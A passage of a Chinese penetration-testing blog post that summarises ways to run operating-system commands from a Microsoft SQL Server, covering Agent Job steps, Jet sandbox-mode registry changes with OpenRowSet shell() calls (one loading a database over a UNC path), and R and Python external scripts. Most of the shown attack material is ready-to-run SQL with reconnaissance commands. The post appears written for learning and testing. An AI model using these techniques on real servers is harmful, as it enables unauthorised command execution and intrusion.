title=\"概念\"></a>概念</h3><p><code>MSSQL Server</code>代理是一个Windows服务，它可以被用来执行自动化任务。管理员可以设置定时代理作业，然后在<code>SQL Server代理服务</code>中执行这些定时作业。<br>所以这个的话我们首先需要开启一个代理<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546003.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"利用条件-3\"><a href=\"#利用条件-3\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、开启了MSSQL Agent Job服务<br>2、有权限新建和执行agent jobs的权利</p></blockquote>\n<h3 id=\"具体利用-3\"><a href=\"#具体利用-3\" class=\"headerlink\" title=\"具体利用\"></a>具体利用</h3><p>具体执行命令的代码如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">USE</span> <span class=\"token package\">msdb</span><span class=\"token punctuation\">;</span> \n<span class=\"token constant\">EXEC</span> dbo<span class=\"token operator\">.</span>sp_add_job @job_name <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'test_powershell_job3'</span><span class=\"token punctuation\">;</span> \n<span class=\"token constant\">EXEC</span> sp_add_jobstep @job_name <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'test_powershell_job3'</span><span class=\"token punctuation\">,</span> @step_name <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'test_powershell_name3'</span><span class=\"token punctuation\">,</span> @subsystem <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'PowerShell'</span><span class=\"token punctuation\">,</span> @command <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'c:\\windows\\system32\\cmd.exe /c whoami /all >c:\\\\123.txt'</span><span class=\"token punctuation\">,</span> @retry_attempts <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> @retry_interval <span class=\"token operator\">=</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">;</span>\n<span class=\"token constant\">EXEC</span> dbo<span class=\"token operator\">.</span>sp_add_jobserver @job_name <span class=\"token operator\">=</span> <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'test_powershell_job3'</span><span class=\"token punctuation\">;</span> \n<span class=\"token constant\">EXEC</span> dbo<span class=\"token operator\">.</span>sp_start_job <span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'test_powershell_job3'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546204.png\" alt=\"在这里插入图片描述\"><br>接下来我们去主机中查看是否存在文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141546237.png\" alt=\"在这里插入图片描述\"><br>成功执行命令</p>\n<h2 id=\"sandbox\"><a href=\"#sandbox\" class=\"headerlink\" title=\"sandbox\"></a>sandbox</h2><h3 id=\"概念-4\"><a href=\"#概念-4\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>沙盒模式是一种安全功能。在沙盒模式下，Access 只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。沙盒提权的核心就是对注册表的操作，依赖<code>xp_regwrite</code>存储过程对注册表修改，且服务器拥有<code> jet.oledb.4.0</code> 驱动。</p>\n<h3 id=\"利用条件-4\"><a href=\"#利用条件-4\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、SA权限</p></blockquote>\n<h3 id=\"具体利用-4\"><a href=\"#具体利用-4\" class=\"headerlink\" title=\"具体利用\"></a>具体利用</h3><p>首先需要激活沙盒模式<br>win2003的激活方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">exec master<span class=\"token operator\">.</span><span class=\"token operator\">.</span>xp_regwrite <span class=\"token string single-quoted-string\">'HKEY_LOCAL_MACHINE'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'SOFTWARE\\Microsoft\\Jet\\4.0\\Engines'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'SandBoxMode'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'REG_DWORD'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token operator\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>win2008的激活方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">exec master<span class=\"token operator\">.</span><span class=\"token operator\">.</span>xp_regwrite <span class=\"token string single-quoted-string\">'HKEY_LOCAL_MACHINE'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'SOFTWARE\\Wow6432Node\\Microsoft\\Jet\\4.0\\Engines'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'SandBoxMode'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'REG_DWORD'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来执行命令即可<br>win2003的执行命令方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> From <span class=\"token function\">OpenRowSet</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Microsoft.Jet.OLEDB.4.0'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">';Database=c:\\windows\\system32\\ias\\ias.mdb'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'select shell(\"net user >c:\\test.txt \")'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>Windows 2008 R2 默认无Access数据库文件,需要自己上传,或者用UNC路径加载文件方能执行命令。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from <span class=\"token function\">openrowset</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'microsoft.jet.oledb.4.0'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">';database=\\\\xxx.xxx.xxx.xxx\\ias.mdb'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'select shell(\"c:\\windows\\system32\\cmd.exe /c net user  >c:\\test.txt \")'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但是,当 <code>X:\\Windows\\System32\\ias\\dnary.mdb</code> 或 <code>X:\\Windows\\System32\\ias\\ias.mdb</code> 被删除时,命令就会无效，所以常见的方式是创建一个数据库,然后再利用<code>jet.oledb</code>调用<code>SysSetup.xml</code>执行系统命令<br>创建数据库代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">declare</span> @hr <span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">declare</span> @<span class=\"token keyword type-declaration\">object</span> <span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">declare</span> @property <span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">;</span>\nexec @hr <span class=\"token operator\">=</span> sp_OACreate <span class=\"token string single-quoted-string\">'ADOX.Catalog'</span><span class=\"token punctuation\">,</span>@<span class=\"token keyword type-declaration\">object</span> <span class=\"token constant\">OUTPUT</span><span class=\"token punctuation\">;</span>\nexec @hr <span class=\"token operator\">=</span> sp_OAMethod @<span class=\"token keyword type-declaration\">object</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'Create'</span><span class=\"token punctuation\">,</span>@property output<span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=SysSetup.xml'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行命令代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from <span class=\"token function\">openrowset</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'microsoft.jet.oledb.4.0'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">';database=SysSetup.xml'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'select shell(\"cmd.exe /c CMD命令\")'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"R和Python脚本\"><a href=\"#R和Python脚本\" class=\"headerlink\" title=\"R和Python脚本\"></a>R和Python脚本</h2><h3 id=\"概念-5\"><a href=\"#概念-5\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>SQL Server 2017加入了Microsoft机器学习服务，该服务允许通过SQL Server中<code>sp_execute_external_script</code>执行Python和R脚本</p>\n<h3 id=\"利用条件-5\"><a href=\"#利用条件-5\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、Machine Learning Services必须要在Python安装过程中选择\n<span class=\"token number\">2</span>、必须启用外部脚本\n<span class=\"token number\">3</span>、用户拥有执行任何外部脚本权限<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"具体利用-5\"><a href=\"#具体利用-5\" class=\"headerlink\" title=\"具体利用\"></a>具体利用</h3><p>R脚本执行命令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">sp_configure <span class=\"token string single-quoted-string\">'external scripts enabled'</span>\n<span class=\"token constant\">GO</span>\n<span class=\"token constant\">EXEC</span> sp_execute_external_script @language<span class=\"token operator\">=</span><span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'R'</span><span class=\"token punctuation\">,</span>@script<span class=\"token operator\">=</span><span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'OutputDataSet &lt;- data.frame(system(\"cmd.exe /c dir\",intern=T))'</span>\n<span class=\"token constant\">WITH</span> <span class=\"token constant\">RESULT</span> <span class=\"token function\">SETS</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>cmd_out<span class=\"token punctuation\">]</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">GO</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>Python脚本执行命令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">exec sp_execute_external_script \n@language <span class=\"token operator\">=</span><span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'Python'</span><span class=\"token punctuation\">,</span>\n@script<span class=\"token operator\">=</span><span class=\"token constant\">N</span><span class=\"token string single-quoted-string\">'import subprocess\np = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE)\nOutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])'</span>\n<span class=\"token constant\">WITH</span> <span class=\"token constant\">RESULT</span> <span class=\"token function\">SETS</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>cmd_out<span class=\"token punctuation\">]</span> <span class=\"token function\">nvarchar</span><span class=\"token punctuation\">(</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://xz.aliyun.com/t/7534#toc-18\">https://xz.aliyun.com/t/7534#toc-18</a><br><a href=\"https://www.freebuf.com/articles/system/267618.html\">https://www.freebuf.com/articles/system/267618.html</a><br><a href=\"https://evi1cg.me/archives/Exec_OS_Command_Via_MSSQL.html\">https://evi1cg.me/archives/Exec_OS_Command_Via_MSSQL.html</a><br><a href=\"https://y4er.com/posts/mssql-execute-command-with-clr-assemblies/#%E5%8F%82%E8%80%83\">https://y4er.com/posts/mssql-execute-command-with-clr-assemblies/#%E5%8F%82%E8%80%83</a><br><a href=\"https://www.freebuf.com/articles/web/332407.html\">https://www.freebuf.com/articles/web/332407.html</a><br><a href=\"https://blog.51cto.com/ro535/1764334\">https://blog.51cto.com/ro535/1764334</a></p>\n","feature":true,"text":"前言学习内网基础时发现对Mssql的命令执行不太熟悉，因此进行了简单总结，希望对正在学习此类知识的师傅有所帮助。 环境搭建本文环境如下 服务器：windows2008 数据库：sqlserver2008 下载链接如下（复制后打开迅雷即可自动加载） ed2k://|file|cn_...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"渗透","slug":"渗透","count":2,"path":"api/categories/渗透.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%A9%E5%B1%95%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%EF%BC%88xp-cmdshell%EF%BC%89\"><span class=\"toc-text\">扩展存储过程（xp_cmdshell）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">具体利用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-sp-OACreate\"><span class=\"toc-text\">系统存储过程(sp_OACreate)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5-1\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8-1\"><span class=\"toc-text\">具体利用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-CLR%EF%BC%89\"><span class=\"toc-text\">本地存储过程(CLR）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5-2\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CLR%E7%BC%96%E5%86%99\"><span class=\"toc-text\">CLR编写</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8-2\"><span class=\"toc-text\">具体利用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%A9%E5%B1%95%EF%BC%88SharpSQLTools%EF%BC%89\"><span class=\"toc-text\">扩展（SharpSQLTools）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PowerUpSQL\"><span class=\"toc-text\">PowerUpSQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SP-Addextendedproc\"><span class=\"toc-text\">SP_Addextendedproc</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Agent-Job%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">Agent Job执行命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5-3\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8-3\"><span class=\"toc-text\">具体利用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sandbox\"><span class=\"toc-text\">sandbox</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5-4\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8-4\"><span class=\"toc-text\">具体利用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#R%E5%92%8CPython%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">R和Python脚本</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5-5\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5\"><span class=\"toc-text\">利用条件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8-5\"><span class=\"toc-text\">具体利用</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">参考链接</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析CTF中的Node.js原型链污染","uid":"13607f594fc71a1c9cef23b62fe9395c","slug":"浅析CTF中的Node.js原型链污染","date":"2023-02-18T16:14:20.000Z","updated":"2023-04-07T16:54:46.000Z","comments":true,"path":"api/articles/浅析CTF中的Node.js原型链污染.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080051519.webp","text":"声明文章首发于Freebuf社区https://www.freebuf.com/articles/web/361333.html 前言Node.js之前并未有太多了解，最近遇上了一些相关题目，发现原型链污染是其一个常考点，在学习后对其进行了简单总结，希望对正在学习的师傅有所帮助 ...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"Node.js","slug":"Node-js","count":1,"path":"api/tags/Node-js.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"内网靶场初探","uid":"9fd6beee5792c51d9bc8310e5aab4662","slug":"内网靶场初探","date":"2023-02-07T16:19:20.000Z","updated":"2024-02-14T07:49:48.000Z","comments":true,"path":"api/articles/内网靶场初探.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141544803.png","text":"前言内容写的很乱，因为第一次搞，有点不太熟练，所以各位师傅简单看看就好，写的比较好的文章，可以参考这两个https://xz.aliyun.com/t/11588#toc-0https://mp.weixin.qq.com 环境搭建https://pan.baidu.com/s/...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}